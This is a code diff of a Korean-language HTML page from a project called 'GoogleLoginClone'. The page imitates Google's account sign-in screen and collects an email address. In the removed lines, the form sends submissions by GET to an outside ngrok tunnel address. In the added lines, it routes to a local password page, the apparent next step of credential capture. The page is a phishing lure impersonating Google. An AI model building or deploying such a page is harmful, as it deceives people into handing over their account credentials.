@@ -3,26 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="/GoogleLoginClone/static/login.css">
+    <link rel="stylesheet" href="/static/login.css">
     <title>로그인 - Google 계정</title>
 </head>
 <body>
     <div id="container">
         <div class="logo">
-            <img src="/GoogleLoginClone/static/logo.png" alt="">
+            <img src="/static/logo.png" alt="">
         </div>
         <h1>로그인</h1>
         <h2>Google 계정 사용</h2>
         <br>
         <div class="forget">
-            <form method="GET" action="https://cfba-49-168-88-14.ngrok-free.app/GoogleLoginClone/templates/login.html">
+            <form method="GET" action="/templates/password.html">
 
                 <input id="email"
                 placeholder=""
                 type="email"
-                pattern=".+@gmail\.com"
+                pattern="[a-zA-Z0-9]+[@][a-zA-Z0-9]+[.]+[a-zA-Z]+[.]*[a-zA-Z]*"
                 autocomplete="off"
                 name="email"
+                oninvalid="this.setCustomValidity('올바른 이메일을 입력하세요.')"
                 required>
 
                 <input id="submit"
@@ -54,6 +55,6 @@
         <a href="#">약관</a>
     </footer>
     
-    <script src="/GoogleLoginClone/script.js"></script>
+    <script src="/script.js"></script>
 </body>
 </html>
